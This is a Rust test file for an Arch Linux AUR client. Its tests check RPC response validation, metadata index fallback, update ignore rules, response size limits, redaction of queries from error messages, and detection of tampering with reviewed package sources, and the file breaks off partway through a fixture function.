use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};

use super::*;
use crate::package_managers::aur_metadata::{index_path, metadata_path, publish_test_metadata};

// S72 fixture methods must run in a dedicated unprivileged receiver. A root
// invocation is a fixture prerequisite error, never the behavioral RED.
fn s72_rpc_json(rows: &[(&str, &str)]) -> Vec<u8> {
    serde_json::to_vec(&serde_json::json!({"type": "multiinfo", "results":
        rows.iter().map(|(name, version)| serde_json::json!({
            "Name": name, "Version": version, "Description": null,
            "Maintainer": null, "NumVotes": 0, "Popularity": 0.0,
            "OutOfDate": null, "LastModified": 1
        })).collect::<Vec<_>>()
    }))
    .unwrap()
}

async fn s72_info_reply(rows: &[(&str, &str)], requested: &[&str]) -> Result<AurResponse> {
    let (endpoint, server) = rpc_body_server(s72_rpc_json(rows), false).await?;
    let names = requested
        .iter()
        .map(|name| (*name).to_owned())
        .collect::<Vec<_>>();
    let result = tokio::time::timeout(
        Duration::from_secs(5),
        AurClient::rpc_info_chunk_at(&endpoint, &names),
    )
    .await?;
    tokio::time::timeout(Duration::from_secs(5), server).await???;
    result
}

#[tokio::test]
async fn exact_aur_info_accepts_one_character_and_rejects_unrelated_rows() -> Result<()> {
    let row = |name| {
        serde_json::json!({
            "Name": name, "Version": "2.0-1", "Description": "Fixture package",
            "Maintainer": "fixture", "NumVotes": 2, "Popularity": 0.1,
            "OutOfDate": null, "FirstSubmitted": 1, "LastModified": 2
        })
    };
    for (rows, expected) in [
        (vec![row("x")], None),
        (vec![], None),
        (vec![row("xx")], Some("unrequested package")),
        (vec![row("x"), row("x")], Some("duplicate package")),
    ] {
        let has_rows = !rows.is_empty();
        let body = serde_json::to_vec(&serde_json::json!({"type": "multiinfo", "results": rows}))?;
        let (endpoint, server) =
            rpc_body_server_with_path(body, false, Some("/rpc?v=5&type=info&arg[]=x")).await?;
        let result =
            tokio::time::timeout(Duration::from_secs(5), info_detailed_at(&endpoint, "x")).await?;
        match expected {
            Some(message) => assert!(result.expect_err(message).to_string().contains(message)),
            None if has_rows => {
                let info = result?.expect("exact one-character package");
                assert_eq!(info.name, "x");
                assert_eq!(info.version, "2.0-1");
                assert_eq!(info.maintainer.as_deref(), Some("fixture"));
            }
            None => assert!(result?.is_none()),
        }
        tokio::time::timeout(Duration::from_secs(5), server).await???;
    }
    Ok(())
}

#[tokio::test]
async fn aur_rpc_info_rejects_unrequested_package() -> Result<()> {
    let result = s72_info_reply(&[("core-demo", "2.0-1")], &["aur-demo"]).await;
    let error = result.expect_err("info response must be bound to this request chunk");
    assert!(
        error.to_string().contains("unrequested package"),
        "{error:#}"
    );
    Ok(())
}

#[tokio::test]
async fn aur_rpc_info_rejects_duplicate_and_conflicting_rows() -> Result<()> {
    for second_version in ["2.0-1", "3.0-1"] {
        let result = s72_info_reply(
            &[("aur-demo", "2.0-1"), ("aur-demo", second_version)],
            &["aur-demo"],
        )
        .await;
        let error = result.expect_err("one requested name must have at most one result");
        assert!(error.to_string().contains("duplicate package"), "{error:#}");
    }
    Ok(())
}

#[tokio::test]
async fn aur_rpc_info_allows_reordered_partial_and_empty_results() -> Result<()> {
    let requested = &["aur-demo", "other-demo", "gone-demo"];
    let response =
        s72_info_reply(&[("other-demo", "2.0-1"), ("aur-demo", "2.0-1")], requested).await?;
    let identities: Vec<_> = response
        .results
        .iter()
        .map(|package| (package.name.as_str(), package.version.as_str()))
        .collect();
    assert_eq!(identities, [("other-demo", "2.0-1"), ("aur-demo", "2.0-1")]);
    let empty = s72_info_reply(&[], requested).await?;
    assert!(
        empty.results.is_empty(),
        "deleted AUR packages may be absent"
    );
    Ok(())
}

struct S72Fixture {
    directory: tempfile::TempDir,
    conf: PathBuf,
    db: PathBuf,
}

impl S72Fixture {
    fn new(names: &[&str]) -> Result<Self> {
        anyhow::ensure!(
            !crate::core::is_root(),
            "S72 prerequisite: isolated receiver must be unprivileged; do not write canonical root paths"
        );
        let directory = tempfile::tempdir_in("/var/tmp")?;
        let root = directory.path().join("root");
        let db = directory.path().join("db");
        let cache = directory.path().join("cache");
        let conf = directory.path().join("pacman.conf");
        std::fs::create_dir_all(&root)?;
        std::fs::create_dir_all(db.join("sync"))?;
        std::fs::create_dir_all(&cache)?;
        for name in names {
            let dir = db.join("local").join(format!("{name}-1.0-1"));
            std::fs::create_dir_all(&dir)?;
            std::fs::write(
                dir.join("desc"),
                format!(
                    "%NAME%\n{name}\n\n%VERSION%\n1.0-1\n\n%DESC%\nS72 fixture\n\n%REASON%\n0\n\n%INSTALLDATE%\n1\n\n"
                ),
            )?;
        }
        std::fs::write(&conf, "[options]\n")?;
        paths::set_test_overrides(Some(root), Some(db.clone()));
        Ok(Self {
            directory,
            conf,
            db,
        })
    }

    fn with_environment(
        &self,
        future: impl std::future::Future<Output = Result<()>>,
    ) -> Result<()> {
        let cache = self.directory.path().join("cache");
        temp_env::with_vars(
            [
                ("OMG_TEST_MODE", None::<&std::ffi::OsStr>),
                ("OMG_PACMAN_CONF", Some(self.conf.as_os_str())),
                ("OMG_CACHE_DIR", Some(cache.as_os_str())),
            ],
            || -> Result<()> {
                assert_eq!(paths::pacman_conf_path(), self.conf);
                assert_eq!(paths::cache_dir(), cache);
                pacman_db::invalidate_caches()?;
                tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()?
                    .block_on(future)
            },
        )
    }

    fn client(&self) -> AurClient {
        let mut settings = Settings::default();
        settings.aur.use_metadata_archive = true;
        settings.aur.metadata_cache_ttl_secs = 3600;
        AurClient {
            build_dir: self.directory.path().join("build"),
            settings,
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        }
    }

    fn index(names: &[&str]) -> Result<()> {
        let archive = metadata_path();
        std::fs::create_dir_all(archive.parent().unwrap())?;
        let data = names
            .iter()
            .map(|name| (*name, "2.0-1"))
            .collect::<Vec<_>>();
        let envelope: serde_json::Value = serde_json::from_slice(&s72_rpc_json(&data))?;
        let file = File::create(&archive)?;
        let mut gzip = flate2::write::GzEncoder::new(file, flate2::Compression::default());
        std::io::Write::write_all(&mut gzip, &serde_json::to_vec(&envelope["results"])?)?;
        gzip.finish()?;
        publish_test_metadata(&archive)?;
        anyhow::ensure!(
            open_fresh_metadata_index(Duration::from_hours(1))?.is_some(),
            "fixture index must actually be fresh and coherent"
        );
        Ok(())
    }

    fn local_bytes(&self) -> Result<Vec<(String, Vec<u8>)>> {
        let mut files = Vec::new();
        for entry in std::fs::read_dir(self.db.join("local"))? {
            let entry = entry?;
            files.push((
                entry.file_name().to_string_lossy().into_owned(),
                std::fs::read(entry.path().join("desc"))?,
            ));
        }
        files.sort_by(|a, b| a.0.cmp(&b.0));
        Ok(files)
    }
}

impl Drop for S72Fixture {
    fn drop(&mut self) {
        paths::reset_test_overrides();
    }
}

#[test]
fn aur_metadata_reader_lock_failure_preserves_generation() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::aur_metadata_reader_lock_failure_preserves_generation";
    if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST) {
        return Ok(());
    }
    let fixture = S72Fixture::new(&["installed-demo"])?;
    fixture.with_environment(async {
        S72Fixture::index(&["metadata-demo"])?;
        let client = fixture.client();
        let snapshot = client
            .fresh_metadata_index()
            .await
            .context("published metadata must be readable before the lock fault")?;
        assert_eq!(
            snapshot
                .get("metadata-demo")
                .context("published package")?
                .version
                .as_str(),
            "2.0-1"
        );
        let local_before = fixture.local_bytes()?;
        let metadata_root = paths::cache_dir().join("aur/_meta");
        let manifest = metadata_root.join("manifest.json");
        let manifest_before = std::fs::read(&manifest)?;
        let published: serde_json::Value = serde_json::from_slice(&manifest_before)?;
        let generation = metadata_root.join(
            published["generation"]
                .as_str()
                .context("published fixture must name its generation")?,
        );
        let archive = generation.join("archive.gz");
        let index = generation.join("index.rkyv");
        let archive_before = std::fs::read(&archive)?;
        let index_before = std::fs::read(&index)?;
        let lock = metadata_root.join("publication.lock");
        let saved_lock = metadata_root.join("publication.lock.saved");
        std::fs::rename(&lock, &saved_lock)?;
        std::fs::create_dir(&lock)?;

        let error = open_fresh_metadata_index(Duration::from_hours(1))
            .expect_err("a directory cannot be opened as the metadata publication lock");
        assert!(
            error
                .chain()
                .any(|cause| cause.downcast_ref::<std::io::Error>().is_some()),
            "the fixture must exercise a real metadata I/O failure: {error:#}"
        );
        assert!(
            client.fresh_metadata_index().await.is_none(),
            "an unreadable metadata generation must fall back instead of failing the caller"
        );
        assert!(
            lock.is_dir(),
            "reader fallback must preserve the failed lock for diagnosis"
        );
        assert_eq!(std::fs::read(&manifest)?, manifest_before);
        assert_eq!(std::fs::read(&archive)?, archive_before);
        assert_eq!(std::fs::read(&index)?, index_before);
        assert_eq!(fixture.local_bytes()?, local_before);
        assert!(
            snapshot.get("metadata-demo").is_some(),
            "an earlier owned snapshot stays usable"
        );

        std::fs::remove_dir(&lock)?;
        std::fs::rename(&saved_lock, &lock)?;
        assert!(
            client.fresh_metadata_index().await.is_some(),
            "restored access must make the same generation readable again"
        );
        let mut disabled = fixture.client();
        disabled.settings.aur.use_metadata_archive = false;
        assert!(
            disabled.fresh_metadata_index().await.is_none(),
            "disabling the metadata archive must ignore a healthy generation"
        );
        Ok(())
    })
}

#[test]
fn aur_metadata_task_completion_preserves_snapshots_and_falls_back() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::aur_metadata_task_completion_preserves_snapshots_and_falls_back";
    if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST) {
        return Ok(());
    }
    let fixture = S72Fixture::new(&[])?;
    fixture.with_environment(async {
        S72Fixture::index(&["metadata-demo"])?;
        let index = open_fresh_metadata_index(Duration::from_hours(1))?
            .context("published metadata fixture must contain an index")?;
        let snapshot = finish_metadata_read(tokio::spawn(async move { Ok(Some(index)) }))
            .await
            .context("a successful metadata worker must retain its owned snapshot")?;
        assert_eq!(
            snapshot
                .get("metadata-demo")
                .context("published package")?
                .version
                .as_str(),
            "2.0-1"
        );
        assert!(
            finish_metadata_read(tokio::spawn(async { Ok(None) }))
                .await
                .is_none()
        );
        assert!(
            finish_metadata_read(tokio::spawn(async {
                Err(std::io::Error::new(
                    std::io::ErrorKind::PermissionDenied,
                    "metadata reader sentinel",
                )
                .into())
            }))
            .await
            .is_none(),
            "metadata-reader errors must leave the caller free to use RPC"
        );
        let panicked = tokio::spawn(async {
            panic!("metadata worker panic sentinel");
        });
        assert!(
            finish_metadata_read(panicked).await.is_none(),
            "a real panicked task must use the same fallback contract"
        );

        for cancel in [false, true] {
            let (started, entered) = tokio::sync::oneshot::channel();
            let (finish, completion) = tokio::sync::oneshot::channel();
            let reader = tokio::spawn(async move {
                started
                    .send(())
                    .expect("metadata worker observer stays alive");
                completion.await.expect("metadata worker must be released");
                Ok(None)
            });
            entered.await.expect("metadata worker must have started");
            if cancel {
                reader.abort();
            } else {
                finish
                    .send(())
                    .expect("metadata worker still awaits completion");
            }
            assert!(
                finish_metadata_read(reader).await.is_none(),
                "both an empty result and cancellation must fall back, cancellation={cancel}"
            );
        }
        assert!(
            snapshot.get("metadata-demo").is_some(),
            "task failures must not invalidate a separately owned index"
        );
        Ok(())
    })
}

#[test]
fn aur_official_dependencies_reject_oversized_install_request_before_mutation() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::aur_official_dependencies_reject_oversized_install_request_before_mutation";
    if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST) {
        return Ok(());
    }
    let fixture = S72Fixture::new(&["installed-demo"])?;
    fixture.with_environment(async {
        let local_before = fixture.local_bytes()?;
        let selected = (0..4_097)
            .map(|index| {
                let name = format!("dependency-{index}");
                OfficialTarget {
                    repository: "fixture".to_owned(),
                    relations: vec![format!("{name}>=1")],
                    name,
                }
            })
            .collect::<Vec<_>>();
        let error = AurClient::install_official_dependencies(&selected)
            .await
            .expect_err(
                "an oversized dependency graph must be refused at the bounded request boundary",
            );
        assert_eq!(
            error.to_string(),
            "Invalid installation item count",
            "the refusal must occur before native installation or elevation: {error:#}"
        );
        assert_eq!(
            fixture.local_bytes()?,
            local_before,
            "bounded-request refusal must preserve the installed catalog"
        );
        assert!(
            !fixture.db.join("db.lck").exists(),
            "request refusal must not acquire a native transaction lock"
        );
        Ok(())
    })
}

#[test]
fn aur_updates_honor_exact_and_glob_ignore_pkg_in_fresh_index() -> Result<()> {
    if crate::core::testing::run_isolated_test(
        "package_managers::aur::client::tests::aur_updates_honor_exact_and_glob_ignore_pkg_in_fresh_index",
    ) {
        return Ok(());
    }
    if Settings::rerun_test_unprivileged(
        "package_managers::aur::client::tests::aur_updates_honor_exact_and_glob_ignore_pkg_in_fresh_index",
    ) {
        return Ok(());
    }
    let fixture = S72Fixture::new(&["held-demo", "held-extra", "free-demo"])?;
    fixture.with_environment(async {
        S72Fixture::index(&["held-demo", "held-extra", "free-demo"])?;
        let held_desc = fixture.db.join("local/held-demo-1.0-1/desc");
        let mut content = std::fs::read_to_string(&held_desc)?;
        content.push_str("%GROUPS%\npinned\n\n");
        std::fs::write(&held_desc, content)?;
        let client = fixture.client();
        let before = fixture.local_bytes()?;
        let names = |mut updates: Vec<(String, Version, Version)>| {
            updates.sort_by(|a, b| a.0.cmp(&b.0));
            for (_, old, new) in &updates {
                assert_eq!(old.to_string(), "1.0-1");
                assert_eq!(new.to_string(), "2.0-1");
            }
            updates.into_iter().map(|row| row.0).collect::<Vec<_>>()
        };
        assert_eq!(
            names(client.get_update_list().await?),
            ["free-demo", "held-demo", "held-extra"]
        );
        std::fs::write(&fixture.conf, "[options]\nIgnoreGroup = pinned\n")?;
        assert_eq!(
            names(client.get_update_list().await?),
            ["free-demo", "held-extra"]
        );
        std::fs::write(&fixture.conf, "[options]\nIgnorePkg = held{,-demo}\n")?;
        assert_eq!(
            names(client.get_update_list().await?),
            ["free-demo", "held-demo", "held-extra"]
        );
        std::fs::write(&fixture.conf, "[options]\nIgnorePkg = held-demo\n")?;
        assert_eq!(
            names(client.get_update_list().await?),
            ["free-demo", "held-extra"]
        );
        std::fs::write(&fixture.conf, "[options]\nIgnorePkg = held-*\n")?;
        assert_eq!(names(client.get_update_list().await?), ["free-demo"]);
        assert_eq!(
            fixture.local_bytes()?,
            before,
            "update reads preserve package state"
        );
        Ok(())
    })
}

#[test]
fn aur_updates_empty_local_catalog_does_not_require_index_or_rpc() -> Result<()> {
    const TEST: &str = "package_managers::aur::client::tests::aur_updates_empty_local_catalog_does_not_require_index_or_rpc";
    if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST) {
        return Ok(());
    }
    let fixture = S72Fixture::new(&[])?;
    std::fs::create_dir(fixture.db.join("local"))?;
    fixture.with_environment(async {
        assert!(pacman_db::get_potential_aur_package_records()?.is_empty());
        assert!(!metadata_path().exists() && !index_path().exists());
        let updates =
            tokio::time::timeout(Duration::from_secs(2), fixture.client().get_update_list())
                .await
                .context("an empty installed catalog must complete without AUR RPC")??;
        assert!(updates.is_empty());
        assert!(!metadata_path().exists() && !index_path().exists());
        assert!(fixture.local_bytes()?.is_empty());
        Ok(())
    })
}

#[test]
fn aur_updates_all_ignored_do_not_require_index_or_rpc() -> Result<()> {
    if crate::core::testing::run_isolated_test(
        "package_managers::aur::client::tests::aur_updates_all_ignored_do_not_require_index_or_rpc",
    ) {
        return Ok(());
    }
    if Settings::rerun_test_unprivileged(
        "package_managers::aur::client::tests::aur_updates_all_ignored_do_not_require_index_or_rpc",
    ) {
        return Ok(());
    }
    let fixture = S72Fixture::new(&["held-demo"])?;
    fixture.with_environment(async {
        std::fs::write(&fixture.conf, "[options]\nIgnorePkg = held-*\n")?;
        assert!(!metadata_path().exists() && !index_path().exists());
        let before = fixture.local_bytes()?;
        let result =
            tokio::time::timeout(Duration::from_secs(2), fixture.client().get_update_list()).await;
        let updates = result.expect("ignored-only update check must complete without RPC")?;
        assert!(updates.is_empty());
        assert_eq!(fixture.local_bytes()?, before);
        Ok(())
    })
}

#[test]
fn aur_rpc_updates_use_one_installed_snapshot() -> Result<()> {
    let test = "package_managers::aur::client::tests::aur_rpc_updates_use_one_installed_snapshot";
    if crate::core::testing::run_isolated_test(test) || Settings::rerun_test_unprivileged(test) {
        return Ok(());
    }
    let fixture = S72Fixture::new(&["aur-demo"])?;
    fixture.with_environment(async {
        let installed = Arc::new(
            pacman_db::list_local_cached()?
                .into_iter()
                .map(|package| (package.name, package.version))
                .collect(),
        );
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
        let endpoint = format!("http://{}/rpc", listener.local_addr()?);
        let desc = fixture.db.join("local/aur-demo-1.0-1/desc");
        let server = tokio::spawn(async move {
            let (mut stream, _) = listener.accept().await?;
            let mut request = [0; 4096];
            anyhow::ensure!(stream.read(&mut request).await? > 0, "empty request");
            let updated = std::fs::read_to_string(&desc)?.replace("1.0-1", "9.0-1");
            std::fs::write(desc, updated)?;
            let body = s72_rpc_json(&[("aur-demo", "2.0-1")]);
            stream
                .write_all(
                    format!(
                        "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                        body.len(),
                    )
                    .as_bytes(),
                )
                .await?;
            stream.write_all(&body).await?;
            anyhow::Ok(())
        });
        let updates = tokio::time::timeout(
            Duration::from_secs(5),
            fixture
                .client()
                .query_aur_updates_at(&endpoint, &["aur-demo".to_owned()], installed),
        )
        .await??;
        tokio::time::timeout(Duration::from_secs(5), server).await???;
        assert_eq!(
            updates
                .into_iter()
                .map(|(name, old, new)| (name, old.to_string(), new.to_string()))
                .collect::<Vec<_>>(),
            [(
                "aur-demo".to_owned(),
                "1.0-1".to_owned(),
                "2.0-1".to_owned()
            )],
        );
        Ok(())
    })
}

#[test]
fn aur_rpc_updates_rejects_unsolicited_installed_official_package() -> Result<()> {
    if crate::core::testing::run_isolated_test(
        "package_managers::aur::client::tests::aur_rpc_updates_rejects_unsolicited_installed_official_package",
    ) {
        return Ok(());
    }
    if Settings::rerun_test_unprivileged(
        "package_managers::aur::client::tests::aur_rpc_updates_rejects_unsolicited_installed_official_package",
    ) {
        return Ok(());
    }
    let fixture = S72Fixture::new(&["aur-demo", "core-demo"])?;
    fixture.with_environment(async {
        let desc = b"%NAME%\ncore-demo\n\n%VERSION%\n2.0-1\n\n%DESC%\nS72 official fixture\n\n";
        let encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        let mut archive = tar::Builder::new(encoder);
        let mut header = tar::Header::new_gnu();
        header.set_size(desc.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        archive.append_data(&mut header, "core-demo-2.0-1/desc", &desc[..])?;
        let compressed = archive.into_inner()?.finish()?;
        let sync_path = fixture.db.join("sync/core.db");
        std::fs::write(&sync_path, compressed)?;
        std::fs::write(
            &fixture.conf,
            "[options]\n[core]\nServer = https://example.invalid/$repo/$arch\n",
        )?;
        pacman_db::invalidate_caches()?;
        let foreign: Vec<String> = pacman_db::get_potential_aur_package_records()?
            .into_iter()
            .map(|package| package.name)
            .collect();
        assert_eq!(
            foreign,
            ["aur-demo"],
            "fixture must prove core-demo is official and unrequested"
        );
        let local_before = fixture.local_bytes()?;
        let sync_before = std::fs::read(&sync_path)?;
        let (endpoint, server) =
            rpc_body_server(s72_rpc_json(&[("core-demo", "3.0-1")]), false).await?;
        let installed = Arc::new(
            pacman_db::list_local_cached()?
                .into_iter()
                .map(|package| (package.name, package.version))
                .collect(),
        );
        let result = tokio::time::timeout(
            Duration::from_secs(5),
            fixture
                .client()
                .query_aur_updates_at(&endpoint, &foreign, installed),
        )
        .await?;
        tokio::time::timeout(Duration::from_secs(5), server).await???;
        let error = result.expect_err("RPC must not relabel an installed official package as AUR");
        assert!(
            format!("{error:#}").contains("AUR RPC response was invalid"),
            "{error:#}"
        );
        assert_eq!(fixture.local_bytes()?, local_before);
        assert_eq!(std::fs::read(&sync_path)?, sync_before);
        Ok(())
    })
}

async fn rpc_body_server(
    body: Vec<u8>,
    chunked: bool,
) -> Result<(String, tokio::task::JoinHandle<Result<()>>)> {
    rpc_body_server_with_path(body, chunked, None).await
}

async fn rpc_body_server_with_path(
    body: Vec<u8>,
    chunked: bool,
    expected_path: Option<&'static str>,
) -> Result<(String, tokio::task::JoinHandle<Result<()>>)> {
    use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
    let endpoint = format!("http://{}/rpc", listener.local_addr()?);
    let server = tokio::spawn(async move {
        let (mut stream, _) = listener.accept().await?;
        if let Some(expected_path) = expected_path {
            let mut request = String::new();
            BufReader::new(&mut stream).read_line(&mut request).await?;
            assert_eq!(request.trim_end(), format!("GET {expected_path} HTTP/1.1"));
        } else {
            let mut request = [0_u8; 4096];
            anyhow::ensure!(stream.read(&mut request).await? > 0, "empty request");
        }
        let mut wire = if chunked {
            b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n".to_vec()
        } else {
            format!(
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            )
            .into_bytes()
        };
        if chunked {
            for chunk in body.chunks(8192) {
                wire.extend_from_slice(format!("{:x}\r\n", chunk.len()).as_bytes());
                wire.extend_from_slice(chunk);
                wire.extend_from_slice(b"\r\n");
            }
            wire.extend_from_slice(b"0\r\n\r\n");
        } else {
            wire.extend_from_slice(&body);
        }
        // Size rejection may close the connection before the fixture is sent.
        if let Err(error) = stream.write_all(&wire).await {
            anyhow::ensure!(
                matches!(
                    error.kind(),
                    std::io::ErrorKind::BrokenPipe | std::io::ErrorKind::ConnectionReset
                ),
                "fixture write failed: {error}"
            );
        }
        anyhow::Ok(())
    });
    Ok((endpoint, server))
}

fn rpc_json_of_size(size: usize) -> Vec<u8> {
    let mut body = br#"{"type":"info","results":[],"padding":""#.to_vec();
    body.resize(size - 2, b'x');
    body.extend_from_slice(b"\"}");
    body
}

#[tokio::test]
async fn aur_rpc_body_limit_rejects_declared_and_chunked_oversized_json() -> Result<()> {
    for chunked in [false, true] {
        let (endpoint, server) =
            rpc_body_server(rpc_json_of_size(16 * 1024 * 1024 + 1), chunked).await?;
        let response = reqwest::Client::builder()
            .no_proxy()
            .build()?
            .get(endpoint)
            .send()
            .await?;
        let error = decode_aur_rpc_response::<AurResponse>(response)
            .await
            .expect_err("oversized valid JSON must be rejected");
        assert!(error.to_string().contains("16 MiB"), "{error:#}");
        server.await??;
    }
    Ok(())
}

#[tokio::test]
async fn aur_rpc_body_limit_applies_to_update_info_chunks() -> Result<()> {
    for chunked in [false, true] {
        let (endpoint, server) =
            rpc_body_server(rpc_json_of_size(16 * 1024 * 1024 + 1), chunked).await?;
        let error = AurClient::rpc_info_chunk_at(&endpoint, &["example".to_string()])
            .await
            .expect_err("update responses must use the metadata limit");
        assert!(error.to_string().contains("16 MiB"), "{error:#}");
        server.await??;
    }
    Ok(())
}

#[tokio::test]
async fn aur_rpc_body_limit_rejects_chunked_json_without_content_length() -> Result<()> {
    let (endpoint, server) = rpc_body_server(rpc_json_of_size(16 * 1024 * 1024 + 1), true).await?;
    let response = reqwest::Client::builder()
        .no_proxy()
        .build()?
        .get(endpoint)
        .send()
        .await?;
    assert_eq!(response.content_length(), None);
    let error = decode_aur_rpc_response::<AurResponse>(response)
        .await
        .expect_err("streamed oversized JSON must be rejected without Content-Length");
    assert!(error.to_string().contains("16 MiB"), "{error:#}");
    server.await??;
    Ok(())
}

#[tokio::test]
async fn aur_rpc_body_limit_accepts_exact_limit_json() -> Result<()> {
    let (endpoint, server) = rpc_body_server(rpc_json_of_size(16 * 1024 * 1024), true).await?;
    let response = reqwest::Client::builder()
        .no_proxy()
        .build()?
        .get(endpoint)
        .send()
        .await?;
    assert!(
        decode_aur_rpc_response::<AurResponse>(response)
            .await?
            .results
            .is_empty()
    );
    server.await??;
    Ok(())
}

#[tokio::test]
async fn aur_rpc_body_limit_preserves_rpc_error_envelopes() -> Result<()> {
    let (endpoint, server) = rpc_body_server(
        br#"{"type":"error","error":"fixture RPC error"}"#.to_vec(),
        true,
    )
    .await?;
    let response = reqwest::Client::builder()
        .no_proxy()
        .build()?
        .get(endpoint)
        .send()
        .await?;
    let error = decode_aur_rpc_response::<AurResponse>(response)
        .await
        .unwrap_err();
    assert_eq!(
        error.to_string(),
        "AUR RPC returned an error: fixture RPC error"
    );
    server.await??;
    Ok(())
}

#[tokio::test]
async fn aur_rpc_body_limit_redacts_body_transport_errors() -> Result<()> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
    let endpoint = format!("http://{}/rpc?arg=private-query", listener.local_addr()?);
    let server = tokio::spawn(async move {
        let (mut stream, _) = listener.accept().await?;
        let mut request = [0_u8; 2048];
        anyhow::ensure!(stream.read(&mut request).await? > 0, "empty request");
        stream
            .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 64\r\n\r\n{")
            .await?;
        stream.shutdown().await?;
        anyhow::Ok(())
    });
    let response = reqwest::Client::builder()
        .no_proxy()
        .build()?
        .get(endpoint)
        .send()
        .await?;
    let error = decode_aur_rpc_response::<AurResponse>(response)
        .await
        .unwrap_err();
    assert_eq!(
        error.to_string(),
        "AUR RPC transport failed. Check your internet connection."
    );
    assert!(!format!("{error:#}").contains("private-query"));
    server.await??;
    Ok(())
}

#[cfg(unix)]
#[test]
fn sandbox_helper_resolves_outside_the_callers_path() {
    let command = sandbox_command_with(Path::new("/home/builder"), "builder", |program| {
        assert_eq!(program, "bwrap");
        Ok(PathBuf::from("/usr/bin/bwrap"))
    })
    .expect("trusted bubblewrap installation");
    assert!(Path::new(command.as_std().get_program()).is_absolute());
}

#[test]
fn auto_makeflags_divide_cores_across_concurrent_builds() {
    assert_eq!(compiler_job_flags(None, None, 16, 1), "-j16");
    assert_eq!(compiler_job_flags(None, None, 16, 4), "-j4");
    assert_eq!(compiler_job_flags(None, None, 8, 8), "");
    assert_eq!(compiler_job_flags(Some("-j2"), None, 16, 8), "-j2");
    assert_eq!(compiler_job_flags(None, Some("-j32"), 16, 8), "-j32");
    assert_eq!(compiler_job_flags(Some("-j2"), Some("-j32"), 16, 8), "-j2");
    assert_eq!(compiler_job_flags(None, None, 16, 0), "-j16");
}

#[tokio::test]
async fn aur_rpc_transport_error_redacts_query_from_display_and_sources() -> Result<()> {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
    let query = "private-aur-query";
    let url = format!(
        "http://{}/rpc?v=5&type=search&arg={query}",
        listener.local_addr()?
    );
    let server = tokio::spawn(async move {
        let (stream, _) = listener.accept().await?;
        drop(stream);
        anyhow::Ok(())
    });

    let transport_error = reqwest::Client::new()
        .get(url)
        .send()
        .await
        .expect_err("closed connection must produce a transport error");
    server.await??;
    assert!(transport_error.to_string().contains(query));

    let error = redact_aur_transport_error(transport_error);
    let mut rendered_chain = error.to_string();
    let mut source = error.source();
    while let Some(cause) = source {
        rendered_chain.push_str(&cause.to_string());
        source = cause.source();
    }

    assert!(!rendered_chain.contains(query), "got: {rendered_chain}");
    assert!(!rendered_chain.contains("arg="), "got: {rendered_chain}");
    Ok(())
}

#[tokio::test]
async fn rpc_info_chunk_retries_a_truncated_response_body() -> Result<()> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
    let endpoint = format!("http://{}/rpc", listener.local_addr()?);
    let server = tokio::spawn(async move {
        let (mut first, _) = listener.accept().await?;
        let mut request = [0_u8; 2048];
        let first_request_len = first.read(&mut request).await?;
        anyhow::ensure!(first_request_len > 0, "first request was empty");
        first
            .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 64\r\n\r\n{\"results\":")
            .await?;
        first.shutdown().await?;

        let (mut second, _) = listener.accept().await?;
        let second_request_len = second.read(&mut request).await?;
        anyhow::ensure!(second_request_len > 0, "second request was empty");
        let body = br#"{"type":"info","resultcount":0,"results":[]}"#;
        second
            .write_all(
                format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n", body.len()).as_bytes(),
            )
            .await?;
        second.write_all(body).await?;
        second.shutdown().await?;
        anyhow::Ok(())
    });

    let response = AurClient::rpc_info_chunk_at(&endpoint, &["example".to_string()]).await?;
    assert!(response.results.is_empty());
    server.await??;
    Ok(())
}

#[test]
fn source_additions_and_duplicate_archive_fields_are_rejected() -> Result<()> {
    let directory = tempfile::tempdir()?;
    std::fs::write(
        directory.path().join("PKGBUILD"),
        "source ./optional-helper\n",
    )?;
    std::fs::write(
        directory.path().join(".SRCINFO"),
        "pkgbase = example\npkgname = example\n",
    )?;
    let source = ReviewedSource::capture(directory.path())?;
    source.verify(directory.path())?;
    std::fs::write(directory.path().join("optional-helper"), "evil\n")?;
    assert!(source.verify(directory.path()).is_err());
    let valid = "pkgname = example\npkgver = 1-1\npkgbase = example\n";
    assert!(AurClient::parse_pkginfo_identity(valid).is_some());
    for extra in ["pkgname = other\n", "pkgver = 2-1\n", "pkgbase = other\n"] {
        assert!(AurClient::parse_pkginfo_identity(&format!("{valid}{extra}")).is_none());
    }
    Ok(())
}

async fn replaced_reviewed_source_fixture() -> Result<(tempfile::TempDir, ReviewedSource)> {
    let directory = tempfile::tempdir()?;
    std::fs::write(directory.path().join("PKGBUILD"), "pkgname=demo\n")?;
    let srcinfo = directory.path().join(".SRCINFO");
    std::fs::write(
        &srcinfo,
        "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\nsource = https://example.org/reviewed.tar.gz\nsource = git+https://example.org/reviewed.git\npkgname = demo\n",
    )
    .expect("write the original reviewed source manifest");
    let reviewed = ReviewedSource::capture(directory.path())?;
